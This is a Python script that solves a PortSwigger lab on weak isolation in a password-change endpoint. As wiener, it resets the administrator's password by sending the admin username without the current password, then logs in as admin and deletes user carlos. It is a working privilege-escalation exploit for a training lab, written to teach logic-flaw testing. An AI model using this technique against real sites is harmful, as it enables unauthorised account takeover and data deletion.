#!/usr/bin/env python3
# Lab: Weak isolation on dual-use endpoint
# Lab-Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('input', attrs={'name': 'csrf'})['value']
    return result


def login(client, host, username, password):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def change_password(client, host):
    url = f'{host}/my-account'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': 'administrator',
            'new-password-1': 'password',
            'new-password-2': 'password'}
    res = client.post(f'{url}/change-password', data=data)
    return f'Password changed successfully!' in res.text


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    if not login(client, host, 'wiener', 'peter'):
        print(f'[-] Failed to login as wiener')
        sys.exit(-2)
    print(f'[+] Logged in as wiener')

    if not change_password(client, host):
        print(f'[-] Failed to change password of administrator')
        sys.exit(-3)
    print(f'[+] Changed password for administrator')

    client.get(f'{host}/logout')

    if not login(client, host, 'administrator', 'password'):
        print(f'[-] Failed to login as administrator')
        sys.exit(-4)
    print(f'[+] Logged in as administrator')

    r = client.get(f'{host}/admin/delete?username=carlos')
    if 'Congratulations, you solved the lab!' not in r.text:
        print(f'[-] Failed to delete user carlos lab')
        sys.exit(-5)

    print(f'[+] Deleted user carlos, lab solved')


if __name__ == "__main__":
    main()
